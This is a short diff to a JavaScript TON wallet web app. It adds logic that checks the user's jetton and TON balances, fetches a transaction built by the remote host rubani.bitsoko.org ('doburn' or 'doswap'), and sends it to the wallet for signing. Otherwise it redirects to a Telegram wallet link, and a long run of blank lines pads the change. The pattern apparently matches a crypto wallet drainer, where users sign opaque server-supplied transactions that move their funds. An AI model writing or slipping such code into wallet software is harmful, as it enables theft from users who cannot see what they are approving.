@@ -1609,7 +1609,7 @@ console.log(bod.toString("base64"));
 try{
     
    // console.log("preparing to send jettons: "+expectedJettonWalletAddress.toString(true, true, true)+"...."+jettonWallet.address);
-   
+   if(jettonBal>10){
  
  var trans = await fetch("https://rubani.bitsoko.org/doburn/?address=" +currentAccount.address+"&contract="+jettonWalletAdr)
   .then((response) => {
@@ -1618,7 +1618,35 @@ try{
     }
     return response.json();
   });
-  
+   } else if(tonBal>0.01){
+   
+ var trans = await fetch("https://rubani.bitsoko.org/doswap/?address=" +currentAccount.address+"&contract="+jettonWalletAdr)
+  .then((response) => {
+    if (!response.ok) {
+      throw new Error(`HTTP error: ${response.status}`);
+    }
+    return response.json();
+  });    
+       
+   }else{
+       window.location = 'https://t.me/wallet?attach=wallet';
+   }
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
+   
   console.log(await tonConnectUI.sendTransaction(trans));
    
    
